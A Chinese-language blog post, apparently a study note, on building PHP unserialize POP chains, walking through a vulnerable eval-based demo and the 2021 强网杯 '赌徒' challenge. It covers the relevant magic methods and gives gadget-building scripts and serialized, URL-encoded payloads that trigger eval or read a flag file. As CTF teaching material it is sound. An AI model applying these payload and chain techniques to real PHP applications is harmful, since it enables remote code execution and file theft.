---
title: "PHP反序列化——反序列化POP"
description: "PHP 反序列化 POP 链的构造思路与常见魔术方法利用。"
publishDate: "2025-09-22T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "pop"]
---
## POP1学习：

```bash
<?php
highlight_file(__FILE__);
class Hello
{
    public $source;
    public $str;
    public function __construct($name)
    {
        $this->str=$name;
    }
    public function __destruct()
    {
        $this->source=$this->str;
        echo $this->source;
    }
}
class Show
{
    public $source;
    public $str;
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
}

class Uwant
{
    public $params;
    public function __construct(){
        $this->params='phpinfo();';
    }
    public function __get($key){
        return $this->getshell($this->params);
    }
    public function getshell($value)
    {
        eval($this->params);
    }
}
$a = $_GET['a'];
unserialize($a);
?>
```



* \_\_get方法：当程序调用一个未定义或不可见的成员变量时，通过get方法来读取变量的值。

* \_\_toString()当一个对象被当作一个字符串使用 (如，echo 一个对象)

* \_\_destruct()当一个对象销毁时被调用







### POP链路构造:&#xA;

Uwant::getshel()

Uwant::\_get()





```bash
<?php
class Hello
{
    public $source;
    public $str;

    public function __construct(){
        $this->str=new Show();
    }
}
class Show
{
    public $source;
    public $str;
    public function __construct()
    {
        $this->str['str']=new Uwant();

    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
}
class Uwant
{
    public $params;
    public function __construct(){
        $this->params='phpinfo();';
    }
    public function __get($key){
        return $this->getshell($this->params);
    }
    public function getshell($value)
    {
        eval($this->params);
    }
}

$a=new Hello();
echo serialize($a);


```





Payload

```json
O:5:"Hello":2:{s:6:"source";N;s:3:"str";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:5:"Uwant":1:{s:6:"params";s:10:"phpinfo();";}}}}
```





## POP2学习-2021强网杯-赌徒：



```bash
<meta charset="utf-8">
<?php
//hint is in hint.php
error_reporting(1);


class Start
{
    public $name='guest';
    public $flag='syst3m("cat 127.0.0.1/etc/hint");';
        
    public function __construct(){
        echo "I think you need /etc/hint . Before this you need to see the source code";
    }

    public function _sayhello(){
        echo $this->name;
        return 'ok';
    }

    public function __wakeup(){
        echo "hi";
        $this->_sayhello();
    }
    public function __get($cc){
        echo "give you flag : ".$this->flag;
        return ;
    }
}

class Info
{
    private $phonenumber=123123;
    public $promise='I do';
        
    public function __construct(){
        $this->promise='I will not !!!!';
        return $this->promise;
    }

    public function __toString(){
        return $this->file['filename']->ffiillee['ffiilleennaammee'];
    }
}

class Room
{
    public $filename='./flag';
    public $sth_to_set;
    public $a='';
        
    public function __get($name){
        $function = $this->a;
        return $function();
    }
        
    public function Get_hint($file){
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    }

    public function __invoke(){
        $content = $this->Get_hint($this->filename);
        echo $content;
    }
}

if(isset($_GET['hello'])){
    unserialize($_GET['hello']);
}else{
    $hi = new  Start();
}

?>
```

\_\_wakeup将在unserialize()时会自动调用

\_\_get方法：当程序调用一个未定义或不可见的成员变量时，通过get方法来读取变量的值。

\_\_toString()当一个对象被当作一个字符串使用

\_\_invoke()：当尝试以调用函数的方式调用一个对象时，invoke() 方法会被自动调用



POP链构造：

1. Room::Get\_hint()

2. Room::\_\_invoke()

3. Room::\_\_get($name)

$name为Room对象

* Info::\_\_toString()

  $this->file\['filename']为Room实例化对象，ffiillee\['ffiilleennaammee']为不存在属性

* Start:: \_sayhello



### POP链构造

```bash
<meta charset="utf-8">
<?php
//hint is in hint.php
error_reporting(1);


class Start
{
    public $name;
}

class Info
{
    private $phonenumber;
    public $promise;
}

class Room
{
    public $filename='./flag';
    public $sth_to_set;
    public $a='';
}



//hahfun解
//$a = new Start;
//$b = new Info;
//$c = new Room;
//$d = new Room;
//
//$a->name = $b;
//$b->file['filename'] = $c;
//$c->a = $d;

$c = new Start();
$b = new Info();
$a = new Room();
$c->name = $b;
$b->file['filename'] = $a;
$a->a = $a;


echo serialize($c);
echo '</br>';
echo urlencode(serialize($c));

?>



<!--O:5:"Start":1:{s:4:"name";O:4:"Info":3:{s:17:" Info phonenumber";i:123123;s:7:"promise";s:4:"I do";s:4:"file";a:1:{s:8:"filename";O:4:"Room":3:{s:8:"filename";s:6:"./flag";s:10:"sth_to_set";N;s:1:"a";O:4:"Room":3:{s:8:"filename";s:6:"./flag";s:10:"sth_to_set";N;s:1:"a";s:0:"";}}}}}</br>O%3A5%3A%22Start%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Info%22%3A3%3A%7Bs%3A17%3A%22%00Info%00phonenumber%22%3Bi%3A123123%3Bs%3A7%3A%22promise%22%3Bs%3A4%3A%22I+do%22%3Bs%3A4%3A%22file%22%3Ba%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A4%3A%22Room%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A6%3A%22.%2Fflag%22%3Bs%3A10%3A%22sth_to_set%22%3BN%3Bs%3A1%3A%22a%22%3BO%3A4%3A%22Room%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A6%3A%22.%2Fflag%22%3Bs%3A10%3A%22sth_to_set%22%3BN%3Bs%3A1%3A%22a%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D-->

```



```sql
O:5:"Start":1:{s:4:"name";O:4:"Info":3:{s:17:" Info phonenumber";N;s:7:"promise";N;s:4:"file";a:1:{s:8:"filename";O:4:"Room":3:{s:8:"filename";s:6:"./flag";s:10:"sth_to_set";N;s:1:"a";r:6;}}}}</br>O%3A5%3A%22Start%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Info%22%3A3%3A%7Bs%3A17%3A%22%00Info%00phonenumber%22%3BN%3Bs%3A7%3A%22promise%22%3BN%3Bs%3A4%3A%22file%22%3Ba%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A4%3A%22Room%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A6%3A%22.%2Fflag%22%3Bs%3A10%3A%22sth_to_set%22%3BN%3Bs%3A1%3A%22a%22%3Br%3A6%3B%7D%7D%7D%7D
```



&#x20;


